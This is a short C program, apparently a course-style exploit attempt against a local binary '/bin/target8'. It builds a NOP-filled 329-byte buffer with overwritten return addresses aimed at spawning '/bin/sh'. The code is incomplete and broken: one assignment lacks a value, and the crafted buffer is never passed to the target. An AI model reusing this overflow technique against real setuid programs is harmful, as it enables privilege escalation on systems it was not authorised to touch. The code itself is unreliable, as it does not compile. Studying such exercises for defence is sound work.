#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/bin/target8"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[329];

  memset(buf, 0x90, sizeof(buf) - 1);

  // execve("/bin/bash", args, NULL)

  buf[328] = 0;

  char* sploit[2];
  sploit[0] = "/bin/sh";
  sploit[1] = NULL;

  *(unsigned int *)(buf + 324) = 0x08048370;
  *(unsigned int *)(buf + 320) = ;
  *(unsigned int *)(buf + 316) = &sploit[0];
  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
